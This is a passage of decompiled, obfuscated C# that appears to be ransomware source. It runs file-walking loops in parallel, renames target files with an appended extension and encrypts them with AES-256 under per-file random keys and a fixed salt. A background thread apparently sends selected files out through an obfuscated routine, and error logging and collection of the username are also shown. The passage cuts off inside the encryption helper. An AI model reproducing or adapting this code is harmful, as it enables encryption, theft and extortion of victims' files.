		CS_0024_003C_003E8__locals0.XkifwNWCmoMwGZ = string_2;
		CS_0024_003C_003E8__locals0.JzpKofJbJVhmO = string_3;
		CS_0024_003C_003E8__locals0.NNgMZKOIgNhI = new List<string> { getString_0(107388093) };
		if (bucWzIppHMvQj == getString_0(107397050))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string mzYOAXEcxjNUB in CS_0024_003C_003E8__locals0.mzYOAXEcxjNUBs)
				{
					if (CS_0024_003C_003E8__locals0.XkifwNWCmoMwGZ.Length != 0)
					{
						string[] xkifwNWCmoMwGZ2 = CS_0024_003C_003E8__locals0.XkifwNWCmoMwGZ;
						int num2 = 0;
						while (num2 < xkifwNWCmoMwGZ2.Length)
						{
							string value2 = xkifwNWCmoMwGZ2[num2];
							if (!mzYOAXEcxjNUB.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09e1;
						}
					}
					try
					{
						if (mzYOAXEcxjNUB.EndsWith(CS_0024_003C_003E8__locals0.LxacNwZMhxsQC))
						{
							goto IL_09e1;
						}
					}
					catch (Exception)
					{
						goto IL_09e1;
					}
					if (mzYOAXEcxjNUB.EndsWith(string_0) && !jbCXXzvZZcmr.Contains(mzYOAXEcxjNUB))
					{
						if (IzNCAdEsbOIXNEP == OnfkOpDsHafJ.getString_0(107396910))
						{
							try
							{
								if (aOUUjWMZRZT.VcOuMaOqJQLYvA(mzYOAXEcxjNUB))
								{
									aOUUjWMZRZT.ZnYPvXRlihCec(mzYOAXEcxjNUB);
								}
							}
							catch
							{
							}
						}
						jbCXXzvZZcmr.Add(mzYOAXEcxjNUB);
						if (!fOFkEYMAweVTkU.Contains(Path.GetDirectoryName(mzYOAXEcxjNUB)))
						{
							fOFkEYMAweVTkU.Add(Path.GetDirectoryName(mzYOAXEcxjNUB));
						}
						VDlfnXwUmEsOwi(mzYOAXEcxjNUB);
						try
						{
							new LhpbtNIzkviAw().fJuJQKilYQO(mzYOAXEcxjNUB);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(mzYOAXEcxjNUB, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (vktNUmAHjywZJ)
									{
										Console.WriteLine(OnfkOpDsHafJ.getString_0(107402714) + mzYOAXEcxjNUB + OnfkOpDsHafJ.getString_0(107402637) + new FileInfo(mzYOAXEcxjNUB).Length + OnfkOpDsHafJ.getString_0(107402648));
										Console.WriteLine(OnfkOpDsHafJ.getString_0(107402095));
									}
								}
								catch
								{
								}
								FsdXZodtOOOc(UPTUMFgiFSZjXAR(OnfkOpDsHafJ.getString_0(107401990)), OnfkOpDsHafJ.getString_0(107387160) + mzYOAXEcxjNUB + OnfkOpDsHafJ.getString_0(107387160) + UPTUMFgiFSZjXAR(OnfkOpDsHafJ.getString_0(107401965)) + OnfkOpDsHafJ.getString_0(107387160) + Environment.UserName + OnfkOpDsHafJ.getString_0(107387160) + UPTUMFgiFSZjXAR(OnfkOpDsHafJ.getString_0(107401980)));
							}
						}
						catch (Exception ex18)
						{
							if (WkkVnLAdbtG)
							{
								try
								{
									File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + mzYOAXEcxjNUB + OnfkOpDsHafJ.getString_0(107401955) + ex18.Message + OnfkOpDsHafJ.getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(mzYOAXEcxjNUB).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex20)
							{
								if (WkkVnLAdbtG)
								{
									try
									{
										File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + mzYOAXEcxjNUB + OnfkOpDsHafJ.getString_0(107402354) + ex20.Message + OnfkOpDsHafJ.getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								WuLujtLeXYYG++;
								goto end_IL_02cd_2;
							}
							if (!(SKaLbyEOuXGH == OnfkOpDsHafJ.getString_0(107396910)) || new FileInfo(mzYOAXEcxjNUB).Length <= Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024 || CS_0024_003C_003E8__locals0.NNgMZKOIgNhI.Contains(string_0))
							{
								if (fRMdlZMqiQJlz)
								{
									CS_0024_003C_003E8__locals0.LxacNwZMhxsQC = QhhcIiFyoEG + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC;
								}
								string text3 = cNttZxOwjDja.IYgvMuxGOQDzu(32);
								string s3 = LaEpsyZsIhRz.FCwTjlNAKSS(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.LxacNwZMhxsQC != OnfkOpDsHafJ.getString_0(107385393))
								{
									if (!oaSbtWubulI)
									{
										if (!csOkMUvFRZv)
										{
											TXBthYggsjbbRKZ(mzYOAXEcxjNUB, mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, MCumIvWMHDkz);
										}
										else
										{
											TXBthYggsjbbRKZ(mzYOAXEcxjNUB, mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!csOkMUvFRZv)
											{
												GALUkaYuFKpmDWrv(mzYOAXEcxjNUB, mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, MCumIvWMHDkz);
											}
											else
											{
												GALUkaYuFKpmDWrv(mzYOAXEcxjNUB, mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex22)
										{
											if (WkkVnLAdbtG)
											{
												try
												{
													File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + mzYOAXEcxjNUB + OnfkOpDsHafJ.getString_0(107385411) + ex22.Message + OnfkOpDsHafJ.getString_0(107396343));
												}
												catch (Exception)
												{
												}
											}
											WuLujtLeXYYG++;
											try
											{
												File.Move(mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, mzYOAXEcxjNUB);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!oaSbtWubulI)
								{
									if (!csOkMUvFRZv)
									{
										TXBthYggsjbbRKZ(mzYOAXEcxjNUB, mzYOAXEcxjNUB + OnfkOpDsHafJ.getString_0(107385388), MCumIvWMHDkz);
									}
									else
									{
										TXBthYggsjbbRKZ(mzYOAXEcxjNUB, mzYOAXEcxjNUB + OnfkOpDsHafJ.getString_0(107385388), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!csOkMUvFRZv)
										{
											GALUkaYuFKpmDWrv(mzYOAXEcxjNUB, mzYOAXEcxjNUB, MCumIvWMHDkz);
										}
										else
										{
											GALUkaYuFKpmDWrv(mzYOAXEcxjNUB, mzYOAXEcxjNUB, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex25)
									{
										if (WkkVnLAdbtG)
										{
											try
											{
												File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + mzYOAXEcxjNUB + OnfkOpDsHafJ.getString_0(107385411) + ex25.Message + OnfkOpDsHafJ.getString_0(107396343));
											}
											catch (Exception)
											{
											}
										}
										WuLujtLeXYYG++;
										goto end_IL_02cd_2;
									}
								}
								if (csOkMUvFRZv)
								{
									if (CS_0024_003C_003E8__locals0.LxacNwZMhxsQC != OnfkOpDsHafJ.getString_0(107385393))
									{
										hMpFuIFlzYwoET(mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, bytes3);
									}
									else
									{
										hMpFuIFlzYwoET(mzYOAXEcxjNUB, bytes3);
									}
								}
								goto IL_09e1;
							}
							CS_0024_003C_003E8__locals0 = new OnfkOpDsHafJ.ixtqopFooHHgU();
							CS_0024_003C_003E8__locals0.qmJughJoNLMQv = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.LxacNwZMhxsQC != OnfkOpDsHafJ.getString_0(107385393))
								{
									if (fRMdlZMqiQJlz)
									{
										CS_0024_003C_003E8__locals0.LxacNwZMhxsQC = QhhcIiFyoEG + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC;
									}
									File.Move(mzYOAXEcxjNUB, mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC);
								}
							}
							catch (Exception ex27)
							{
								if (WkkVnLAdbtG)
								{
									try
									{
										File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + mzYOAXEcxjNUB + OnfkOpDsHafJ.getString_0(107402325) + ex27.Message + OnfkOpDsHafJ.getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								WuLujtLeXYYG++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.FRRjlCxQnGx = OnfkOpDsHafJ.getString_0(107388113);
							if (CS_0024_003C_003E8__locals0.LxacNwZMhxsQC != OnfkOpDsHafJ.getString_0(107385393))
							{
								CS_0024_003C_003E8__locals0.FRRjlCxQnGx = mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC;
							}
							else
							{
								CS_0024_003C_003E8__locals0.FRRjlCxQnGx = mzYOAXEcxjNUB;
							}
							if (JpHrjpLDqbGD == OnfkOpDsHafJ.getString_0(107396910))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item in puDhoHwRWOSf)
									{
										if (CS_0024_003C_003E8__locals0.FRRjlCxQnGx.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.qmJughJoNLMQv.LxacNwZMhxsQC) && vxbhvYdpuaSKJ == OnfkOpDsHafJ.ixtqopFooHHgU.getString_0(107396913))
										{
											if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.FRRjlCxQnGx).Length)
											{
												try
												{
													boHoxxDHHXchTbg.QZMptOJxrqEOUZv(OnfkOpDsHafJ.ixtqopFooHHgU.getString_0(107388229), OnfkOpDsHafJ.ixtqopFooHHgU.getString_0(107388224), OnfkOpDsHafJ.ixtqopFooHHgU.getString_0(107388179), CS_0024_003C_003E8__locals0.FRRjlCxQnGx);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.FRRjlCxQnGx.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == OnfkOpDsHafJ.ixtqopFooHHgU.getString_0(107397073))
										{
											try
											{
												boHoxxDHHXchTbg.QZMptOJxrqEOUZv(OnfkOpDsHafJ.ixtqopFooHHgU.getString_0(107388229), OnfkOpDsHafJ.ixtqopFooHHgU.getString_0(107388224), OnfkOpDsHafJ.ixtqopFooHHgU.getString_0(107388179), CS_0024_003C_003E8__locals0.FRRjlCxQnGx);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = cNttZxOwjDja.IYgvMuxGOQDzu(32);
							string s4 = LaEpsyZsIhRz.FCwTjlNAKSS(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (dmfMWdUvIkOnV == OnfkOpDsHafJ.getString_0(107397070))
							{
								byte[] array2 = null;
								byte[] byte_2 = gXMFgMIeYcrF.uIceXfBFVURI(CS_0024_003C_003E8__locals0.FRRjlCxQnGx, Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024);
								if (gXMFgMIeYcrF.EvSGvxrPMdCC(toVAoGNjbAD: (!CpKJVfXcbzad) ? (csOkMUvFRZv ? gXMFgMIeYcrF.VFZJqJWFkaov(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gXMFgMIeYcrF.VFZJqJWFkaov(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.JzpKofJbJVhmO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (csOkMUvFRZv ? qYGhbgYMkFdbXtd.ytKbEkOaFFyA(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qYGhbgYMkFdbXtd.ytKbEkOaFFyA(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.JzpKofJbJVhmO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), iupuKHitGzgBt: CS_0024_003C_003E8__locals0.FRRjlCxQnGx, uEkxZDiROSW: bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, mzYOAXEcxjNUB);
								}
								catch (Exception)
								{
								}
							}
							else if (!csOkMUvFRZv)
							{
								if (bneaMJWUstJ.xXulSKqBCHR(CS_0024_003C_003E8__locals0.FRRjlCxQnGx, YyzRRVpMLORcsyqnO, CS_0024_003C_003E8__locals0.JzpKofJbJVhmO))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, mzYOAXEcxjNUB);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (bneaMJWUstJ.xXulSKqBCHR(CS_0024_003C_003E8__locals0.FRRjlCxQnGx, YyzRRVpMLORcsyqnO, text4, bytes4))
								{
									goto IL_09e1;
								}
								try
								{
									File.Move(mzYOAXEcxjNUB + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, mzYOAXEcxjNUB);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_09e1;
						}
					}
					continue;
					IL_09e1:
					CS_0024_003C_003E8__locals0.mzYOAXEcxjNUBs.Remove(mzYOAXEcxjNUB);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.mzYOAXEcxjNUBs, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new OnfkOpDsHafJ.DsrmQzBMlIpmT();
			CS_0024_003C_003E8__locals0.qmJughJoNLMQv = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.ZFvhneTfBTn = string_0;
			if (CS_0024_003C_003E8__locals0.XkifwNWCmoMwGZ.Length != 0)
			{
				string[] xkifwNWCmoMwGZ = CS_0024_003C_003E8__locals0.XkifwNWCmoMwGZ;
				int num = 0;
				while (num < xkifwNWCmoMwGZ.Length)
				{
					string value = xkifwNWCmoMwGZ[num];
					if (!CS_0024_003C_003E8__locals0.ZFvhneTfBTn.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.ZFvhneTfBTn.EndsWith(CS_0024_003C_003E8__locals0.LxacNwZMhxsQC))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!jbCXXzvZZcmr.Contains(CS_0024_003C_003E8__locals0.ZFvhneTfBTn))
			{
				if (IzNCAdEsbOIXNEP == OnfkOpDsHafJ.getString_0(107396910))
				{
					try
					{
						if (aOUUjWMZRZT.VcOuMaOqJQLYvA(CS_0024_003C_003E8__locals0.ZFvhneTfBTn))
						{
							aOUUjWMZRZT.ZnYPvXRlihCec(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
						}
					}
					catch
					{
					}
				}
				jbCXXzvZZcmr.Add(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
				if (!fOFkEYMAweVTkU.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ZFvhneTfBTn)))
				{
					fOFkEYMAweVTkU.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ZFvhneTfBTn));
				}
				VDlfnXwUmEsOwi(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
				try
				{
					new LhpbtNIzkviAw().fJuJQKilYQO(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (vktNUmAHjywZJ)
							{
								Console.WriteLine(OnfkOpDsHafJ.getString_0(107402714) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + OnfkOpDsHafJ.getString_0(107402637) + new FileInfo(CS_0024_003C_003E8__locals0.ZFvhneTfBTn).Length + OnfkOpDsHafJ.getString_0(107402648));
								Console.WriteLine(OnfkOpDsHafJ.getString_0(107402095));
							}
						}
						catch
						{
						}
						FsdXZodtOOOc(UPTUMFgiFSZjXAR(OnfkOpDsHafJ.getString_0(107401990)), OnfkOpDsHafJ.getString_0(107387160) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + OnfkOpDsHafJ.getString_0(107387160) + UPTUMFgiFSZjXAR(OnfkOpDsHafJ.getString_0(107401965)) + OnfkOpDsHafJ.getString_0(107387160) + Environment.UserName + OnfkOpDsHafJ.getString_0(107387160) + UPTUMFgiFSZjXAR(OnfkOpDsHafJ.getString_0(107401980)));
					}
				}
				catch (Exception ex2)
				{
					if (WkkVnLAdbtG)
					{
						try
						{
							File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + OnfkOpDsHafJ.getString_0(107401955) + ex2.Message + OnfkOpDsHafJ.getString_0(107396343));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.ZFvhneTfBTn).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (WkkVnLAdbtG)
						{
							try
							{
								File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + OnfkOpDsHafJ.getString_0(107402354) + ex4.Message + OnfkOpDsHafJ.getString_0(107396343));
							}
							catch (Exception)
							{
							}
						}
						WuLujtLeXYYG++;
						goto end_IL_031d_2;
					}
					if (SKaLbyEOuXGH == OnfkOpDsHafJ.getString_0(107396910) && new FileInfo(CS_0024_003C_003E8__locals0.ZFvhneTfBTn).Length > Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.LxacNwZMhxsQC != OnfkOpDsHafJ.getString_0(107385393))
							{
								if (fRMdlZMqiQJlz)
								{
									CS_0024_003C_003E8__locals0.LxacNwZMhxsQC = QhhcIiFyoEG + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC;
								}
								File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC);
							}
						}
						catch (Exception ex6)
						{
							if (WkkVnLAdbtG)
							{
								try
								{
									File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + OnfkOpDsHafJ.getString_0(107402325) + ex6.Message + OnfkOpDsHafJ.getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							WuLujtLeXYYG++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.LxacNwZMhxsQC != OnfkOpDsHafJ.getString_0(107385393))
						{
							CS_0024_003C_003E8__locals0.ZFvhneTfBTn += CS_0024_003C_003E8__locals0.LxacNwZMhxsQC;
						}
						if (JpHrjpLDqbGD == OnfkOpDsHafJ.getString_0(107396910))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in puDhoHwRWOSf)
								{
									if (CS_0024_003C_003E8__locals0.ZFvhneTfBTn.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.qmJughJoNLMQv.LxacNwZMhxsQC) && vxbhvYdpuaSKJ == OnfkOpDsHafJ.DsrmQzBMlIpmT.getString_0(107396916))
									{
										if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ZFvhneTfBTn).Length)
										{
											try
											{
												boHoxxDHHXchTbg.QZMptOJxrqEOUZv(OnfkOpDsHafJ.DsrmQzBMlIpmT.getString_0(107388232), OnfkOpDsHafJ.DsrmQzBMlIpmT.getString_0(107388227), OnfkOpDsHafJ.DsrmQzBMlIpmT.getString_0(107388182), CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.ZFvhneTfBTn.ToLower().EndsWith(item2) && vxbhvYdpuaSKJ == OnfkOpDsHafJ.DsrmQzBMlIpmT.getString_0(107397076))
									{
										try
										{
											boHoxxDHHXchTbg.QZMptOJxrqEOUZv(OnfkOpDsHafJ.DsrmQzBMlIpmT.getString_0(107388232), OnfkOpDsHafJ.DsrmQzBMlIpmT.getString_0(107388227), OnfkOpDsHafJ.DsrmQzBMlIpmT.getString_0(107388182), CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = cNttZxOwjDja.IYgvMuxGOQDzu(32);
						string s = LaEpsyZsIhRz.FCwTjlNAKSS(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dmfMWdUvIkOnV == OnfkOpDsHafJ.getString_0(107397070))
						{
							byte[] array = null;
							byte[] byte_ = gXMFgMIeYcrF.uIceXfBFVURI(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024);
							if (!gXMFgMIeYcrF.EvSGvxrPMdCC(toVAoGNjbAD: (!CpKJVfXcbzad) ? (csOkMUvFRZv ? gXMFgMIeYcrF.VFZJqJWFkaov(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gXMFgMIeYcrF.VFZJqJWFkaov(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.JzpKofJbJVhmO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (csOkMUvFRZv ? qYGhbgYMkFdbXtd.ytKbEkOaFFyA(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qYGhbgYMkFdbXtd.ytKbEkOaFFyA(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.JzpKofJbJVhmO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), iupuKHitGzgBt: CS_0024_003C_003E8__locals0.ZFvhneTfBTn, uEkxZDiROSW: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!csOkMUvFRZv)
						{
							if (!bneaMJWUstJ.xXulSKqBCHR(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, YyzRRVpMLORcsyqnO, CS_0024_003C_003E8__locals0.JzpKofJbJVhmO))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!bneaMJWUstJ.xXulSKqBCHR(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, YyzRRVpMLORcsyqnO, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (fRMdlZMqiQJlz)
						{
							CS_0024_003C_003E8__locals0.LxacNwZMhxsQC = QhhcIiFyoEG + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC;
						}
						string text2 = cNttZxOwjDja.IYgvMuxGOQDzu(32);
						string s2 = LaEpsyZsIhRz.FCwTjlNAKSS(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.LxacNwZMhxsQC != OnfkOpDsHafJ.getString_0(107385393))
						{
							if (!oaSbtWubulI)
							{
								if (!csOkMUvFRZv)
								{
									TXBthYggsjbbRKZ(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, MCumIvWMHDkz);
								}
								else
								{
									TXBthYggsjbbRKZ(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!csOkMUvFRZv)
									{
										GALUkaYuFKpmDWrv(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, MCumIvWMHDkz);
									}
									else
									{
										GALUkaYuFKpmDWrv(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (WkkVnLAdbtG)
									{
										try
										{
											File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + OnfkOpDsHafJ.getString_0(107385411) + ex11.Message + OnfkOpDsHafJ.getString_0(107396343));
										}
										catch (Exception)
										{
										}
									}
									WuLujtLeXYYG++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!oaSbtWubulI)
						{
							if (!csOkMUvFRZv)
							{
								TXBthYggsjbbRKZ(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + OnfkOpDsHafJ.getString_0(107385388), MCumIvWMHDkz);
							}
							else
							{
								TXBthYggsjbbRKZ(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + OnfkOpDsHafJ.getString_0(107385388), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!csOkMUvFRZv)
								{
									GALUkaYuFKpmDWrv(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn, MCumIvWMHDkz);
								}
								else
								{
									GALUkaYuFKpmDWrv(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (WkkVnLAdbtG)
								{
									try
									{
										File.AppendAllText(PhOHjwgFpwoPkI, OnfkOpDsHafJ.getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + OnfkOpDsHafJ.getString_0(107385411) + ex14.Message + OnfkOpDsHafJ.getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								WuLujtLeXYYG++;
								return;
							}
						}
						if (csOkMUvFRZv)
						{
							if (CS_0024_003C_003E8__locals0.LxacNwZMhxsQC != OnfkOpDsHafJ.getString_0(107385393))
							{
								hMpFuIFlzYwoET(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + CS_0024_003C_003E8__locals0.LxacNwZMhxsQC, bytes2);
							}
							else
							{
								hMpFuIFlzYwoET(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			CS_0024_003C_003E8__locals0.mzYOAXEcxjNUBs.Remove(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
		});
	}

	private static void GuiOEkSllrUO(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
